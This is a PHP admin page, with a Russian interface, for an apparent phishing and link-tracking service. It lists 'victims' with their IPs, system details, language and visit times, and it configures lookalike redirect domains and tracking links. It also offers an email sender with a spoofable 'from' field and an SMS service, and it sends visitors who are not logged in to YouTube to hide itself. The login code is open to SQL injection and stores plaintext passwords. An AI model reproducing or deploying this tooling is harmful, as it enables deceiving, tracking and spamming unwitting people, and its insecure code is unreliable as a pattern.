<?php
  session_start();
  include("blocks/bd.php");
?>
<?
  // Проверка авторизации
  if (isset($_POST['auth']))
  {
      // Запоминаем переменные
  		$room_username = $_POST['username'];
  		$room_pass = $_POST['password'];
      // Создаем переменные для проверки данных через обращение к базе
  		$auth_query = mysqli_query($db," select * from rooms WHERE name='$room_username'");
  		$auth_query_result = mysqli_fetch_array($auth_query);
  		$auth_query->Close();
      // Если пароль совпадает - помещаем данные в переменную СЕССИИ 'logged_user'
  		if($auth_query_result['pass'] == $room_pass)
  		{
        $_SESSION['logged_user'] = $auth_query_result;
        //<!-- Начало блока шапки -->

        //<!-- Конец блока шапки -->

      }
      // Если не совпадает
  		else
  		{
  			echo("<script type='text/javascript'>");
  			echo("alert('Неверный пароль!');
  			      </script>");
  		}


  }

  if (isset($_SESSION['logged_user'])) {
    include("blocks/header.php");
    ?>
<body>
    <div class='container'>
      <?
        $room_username = $_SESSION['logged_user']['name'];

        $result2 = mysqli_query($db," select * from rooms WHERE name='$room_username'");
        $ip = $_SERVER["REMOTE_ADDR"];
        $myrow2 = mysqli_fetch_array($result2);
        $result2->Close();

        $room_id = $myrow2['id'];

        echo "
          <div class='jumbotron' style='text-align: center;'>
            <h1 class='display-4' >Добро пожаловать, <b>{$myrow2['name']}</b>!</h1>
            <p class='lead'>Имя комнаты - <b>[{$myrow2['title']}]</b></p>
            <hr class='my-4'>
            <div class='alert alert-info' role='alert' id='IP_adr'>
              Ваш IP: <b>{$ip}</b>
            </div>
            <div class='alert alert-info' role='alert' id='IP_adr'>
              Ваш ID: <b>{$myrow2['id']}</b>
            </div>
            <div class='alert alert-info' role='alert' id='exit'>
              <a href='logout.php'>Выйти</a>
            </div>
          </div>
        "
      ?>

    </div>

    <div id="page">
      <div id="content">
        <div class="inner">
          <!-- tabs -->
          <div class="container" style="text-align: center; margin-bottom: 2rem;">
            <? $result = mysqli_query($db," select * from visitor WHERE room_id='{$room_id}'"); ?>
            <div class="btn-group btn-group-lg" role="group" aria-label="...">
              <? if(mysqli_num_rows($result) > 0) { ?>
                <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#1">Жертвы</button>
              <? } ?>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#2">Основное</button>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#3">Настройки</button>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#4">Комментарий</button>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#5">Инструкция</button>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#6">СМС</button>
              <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#7">MaileR</button>
            </div>
          </div>
          <!-- end -->

          <div class="content container"><!-- container-fluid -->
            <div class="table-responsive" class="js-simple-tab-content <? if(mysqli_num_rows($result) == 0) { echo ' d-n';}?>" id="1">
              <p class="h1" style="text-align:center;">Жертвы</p>
              <table class="table">
                <thead class="thead-dark">
                  <tr style="text-align: center;">
                    <th scope="col">ID ЖЕРТВЫ:</th>
                    <th scope="col">IP ЖЕРТВЫ:</th>
                    <th scope="col">ИНФОРМАЦИЯ О СИСТЕМЕ:</th>
                    <th scope="col">ЯЗЫК ИНТЕРФЕЙСА:</th>
                    <th scope="col">БЫЛ ПЕРЕНАПРАВЛЕН:</th>
                    <th scope="col">ВРЕМЯ ПЕРЕХОДА</th>
                    <th scope="col">ДЕЙСТВИЯ</th>
                  </tr>
                </thead>
              <?
                  //$myrow = mysqli_fetch_array($result);
                  while($myrow = mysqli_fetch_array($result))
                  {
                    //var_dump($myrow);
                    echo "
                        <tr>
                          <td scope='row'>{$myrow['id']}</td>
                          <td>
                            <ul class='list-group list-group-flush'>
                              <li class='list-group-item'>
                                {$myrow['ip']}
                              </li>
                              <li class='list-group-item'>
                                <a class='btn btn-primary' role='button' href=\"https://api.2ip.ua/provider.xml?ip={$myrow['ip']}\" onclick=\"window.open(this.href, 'windowName', 'width=750, height=750, left=340, top=64, scrollbars, resizable'); return false;\">Провайдер</a>
                              </li>
                              <li class='list-group-item'>
                                <a class='btn btn-primary' role='button' onclick=\"window.open(this.href, 'windowName', 'width=500, height=500, left=340, top=64, scrollbars, resizable'); return false;\" href=\"get_geo.php\">Местонахождение</a>
                              </li>
                            </ul>
                          </td>
                          <td class='text-info' style='word-break: break-all;'>{$myrow['sys_info']}</td>
                          <td style='word-break: break-all;'>{$myrow['lang']}</td>
                          <td style='word-break: break-all;' data-toggle='tooltip' data-placement='bottom' title='{$myrow['url_to']}'>{$myrow['url_to']}</td>
                          <td>{$myrow['time']}</td>
                          <td><a class='btn btn-primary' role='button' href='drop_v.php?id={$myrow['id']}'> УДАЛИТЬ </a></td>
                        </tr>
                      ";
                  }
              ?>
              </table>
            </div>
            <!-- ///////////////////////////////////////////////tabs / modals////////////////////////////////////////////////////////////////////////////////////// -->
            <!-- Modal -->

            <!-- 2 -->
            <div class="modal fade" id="2" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title">Основное</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    <h2 style='text-align: center;'>Основное</h2>
                    <div class="table">
                      <table class="table-responsive">
                        <tbody>
                        <tr>
                          <th><b>Название комнаты:</b></th>
                          <td><?=$myrow2['title']?></td>
                        </tr>
                        <tr>
                          <th><b>Имя влядельца:</b> </th>
                          <td><?=$myrow2['name']?></td>
                        </tr>
                        <tr>
                          <th><b>Email:</b> </th>
                          <td><?=$myrow2['email']?></td>
                        </tr>
                        <tr>
                          <th><b>Перенаправляем на:</b></th>
                          <td><a href="http://<?=$myrow2['url_to']?>"><?=$myrow2['url_to']?></a></td>
                        </tr>
                        <tr>
                          <th><b>Ваша ссылка первого уровня:</b> </th>
                          <td>
                            <a href="http://<? if (empty ($myrow2['domen'])) { echo $_SERVER['HTTP_HOST']; } else { echo $myrow2['domen'];} ?>/router.php?id=<?=$room_id?>">
                              http://<? if (empty ($myrow2['domen'])) { echo $_SERVER['HTTP_HOST']; } else { echo $myrow2['domen'];} ?>/router.php?id=<?=$room_id?>
                            </a>
                          </td>
                        </tr>
                        <?if ($myrow2['way']) {?>
                        <tr>
                          <th><b>Ваша ссылка второго уровня:</b> </th>
                          <td>
                            <a href="http://<?=$myrow2['domen']?>/<?=$myrow2['way']?>">
                              http://<?=$myrow2['domen']?>/<?=$myrow2['way']?>
                            </a>
                          </td>
                        </tr>
                        <? }?>
                        </tbody>
                      </table>
                    </div>
                  </div>
                  <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

            <!-- 3 -->
            <div class="modal fade" id="3" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title">Настройки</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    <h2 style='text-align: center;'>Настройки</h2>
                    <form method="post" action="lib/do_save_settings_room.php" style="" id="settings_room">
                      <div class="table">
                        <table class="table-resizable" border="0" bordercolor="#900" style="width:100%; ">
                          <tr>
                            <th>
                              <b>Название комнаты:</b>
                            </th>
                            <td>
                              <input type='hidden' name="settings[id]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['id']?> ' size='30'>
                              <input type='text' name="settings[title]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['title']?>' size='30'>
                            </td>
                          </tr>
                          <tr>
                            <th>
                              <b>Имя влядельца:</b>
                            </th>
                            <td><input type='text'  name="settings[name]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['name']?>' size='30'></td>
                          </tr>
                          <tr>
                            <th>
                              <b>Пароль:</b>
                            </th>
                            <td><input type='text' name="settings[pass]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['pass']?>' size='30'></td>
                          </tr>
                          <tr>
                            <th>
                              <b>Email:</b>
                            </th>
                            <td><input type='text' name="settings[email]"  placeholder='Введите пожалуйста символы' value='<?=$myrow2['email']?>' size='30'></td>
                          </tr>
                          <tr>
                            <th>
                              <b>Доменное имя:</b><br>
                              <small>(Выберите доменное имя, которое будет использоваться для переадресации).</small>
                            </th>
                            <td>
                              <select name="settings[domen]" >
                                <option selected value='<?=$myrow2['domen']?>'><? echo $myrow2['domen'];?></option>
                                <!--<option value='<?=$myrow2['domen']?>'>default</option>-->
                                <option value = '<? echo ($myrow2['domen']=="www.cybergarden.kiev.ua" ? "www.youtube.co.ua" : "www.cybergarden.kiev.ua")?>'>
                                  <? echo ($myrow2['domen']=="www.cybergarden.kiev.ua" ? "www.youtube.co.ua" : "www.cybergarden.kiev.ua")  ?>
                                </option>
                              </select>
                            </td>
                          </tr>
                          <tr>
                            <th>
                              <b>Перенаправляем на: </b> <br/>
                              <small>
                                (Укажите конечный адресс, на который собираетесь перенаправить). <br/>
                                <b>Без https://</b>
                              </small>
                            </th>
                            <td>
                              <input type='text' name="settings[url_to]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['url_to']?>' size='30'>
                            </td>
                          </tr>
                          <tr>
                            <th>
                              <b>Ваша ссылка второго уровня:</b>
                              <br>
                              <small>http://<?=$myrow2['domen']?>/ </small>
                            </th>
                            <td>
                              <input type='text' name="settings[way]" placeholder='Введите пожалуйста символы' value='<?=$myrow2['way']?>' size='30'>
                            </td>
                          </tr>
                          <tr>
                            <td colspan="2">
                              <input name="save" class="btn btn-success btn-lg btn-block" type="submit" value="Сохранить" class="bottom2">
                            </td>
                          </tr>
                        </table>
                      </div>
                    </form>
                  </div>
                  <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

            <!-- 4 -->
            <div class="modal fade" id="4" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title">Комментарий</h5>
                    <button type="button" class= "close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    Здесь вы сможете оставить комментарии!
                  </div>
                  <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

            <!-- 5 -->
            <div class="modal fade" id="5" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title">Инструкция</h5>
                    <button type="button" class= "close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    <p>
                      <h4>1. Из соображений безопасности - вход в кабинет осуществляется только со страницы авторизации.
                        При попытке войти в кабинет напрямую Вы будете перенаправлены на сторонний ресурс.
                      <h4>
                    </p>

                  </div>
                  <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

            <!-- 6 -->
            <div class="modal fade" id="6" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title">SMS</h5>
                    <button type="button" class= "close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    <div>
                      <iframe scrolling="no" sandbox="allow-same-origin || allow-top-navigation || allow-forms || allow-scripts" frameborder="0"  seamless allowtransparency  align="left" src="http://sms.ri4.biz/">
                        Ваш браузер не поддерживает плавающие фреймы!
                       </iframe>
                     </div>
                  </div>
                  <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

            <!-- 7 -->
            <div class="modal fade" id="7" tabindex="-1" role="dialog">
              <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
                <div class="modal-content">
                  <div class="modal-header" style="background-color: #007bff;">
                    <h5 class="modal-title">Mail</h5>
                    <button type="button" class= "close" data-dismiss="modal" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                  </div>
                  <div class="modal-body">
                    <div>
                      <div style="text-align: center; width: 100%;"> <h1>Здесь Вы можете создать Ваше письмо</h1> </div>
                        <script src="ckeditor/ckeditor.js"></script>
                          <form class="" action="send_mail.php" method="post">
                            <div style="padding: 5px 20%;">
                              <input type="text" name="to" placeholder="Введите адресс, на который будет отправлено письмо" size="60%">
                            </div>
                            <div style="padding: 5px 20%;">
                              <input type="text" name="from" placeholder="Введите @mail, с которого будет отправлено письмо" size="60%">
                            </div>
                            <div class="">
                              <textarea class="ckeditor" name="editor"></textarea>
                            </div>

                            <input name="save" class="btn btn-success btn-lg btn-block" type="submit" value="Отправить" class="bottom2">
                          </form>
                     </div>
                  </div>
                  <div class="modal-footer">

                  </div>
                </div>
              </div>
            </div>
            <!-- end -->

          </div>
        </div>
      </div>
      <!-- end #page -->
    </div>
</body>
    <?
  }
  else {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: https://www.youtube.com/channel/UCiqVQSqb28krE7vc4B2QtPw");
  }


  ?>


</html>
